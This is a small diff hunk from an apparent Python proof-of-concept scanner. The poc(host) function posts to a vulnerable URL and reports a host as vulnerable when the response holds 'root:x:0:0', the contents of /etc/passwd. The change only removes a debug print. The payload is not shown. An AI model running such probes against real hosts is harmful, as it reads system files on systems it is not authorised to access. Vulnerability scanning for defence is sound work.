@@ -40,7 +40,6 @@ def poc(host):
     try:
         
         r = requests.post(vulurl, headers=headers,data=data)
-        print(r.text)
         if r.status_code==200 and "root:x:0:0" in r.text :
             print("http://"+host+":true")
         else:
